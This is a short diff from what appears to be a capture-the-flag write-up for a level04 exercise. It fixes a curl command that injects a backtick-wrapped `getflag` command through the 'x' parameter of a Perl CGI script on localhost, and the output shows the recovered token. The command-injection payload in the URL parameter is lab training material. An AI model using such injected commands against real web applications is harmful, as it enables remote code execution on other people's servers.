@@ -22,7 +22,7 @@ cat level04.pl
     x(param("x"));
 
 - executer getflag
-curl -v http://localhost:4747/level04.pl?x=/`getflag/`
+curl -v http://localhost:4747/level04.pl?x=\`getflag\`
     -> Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
 
 Sources:
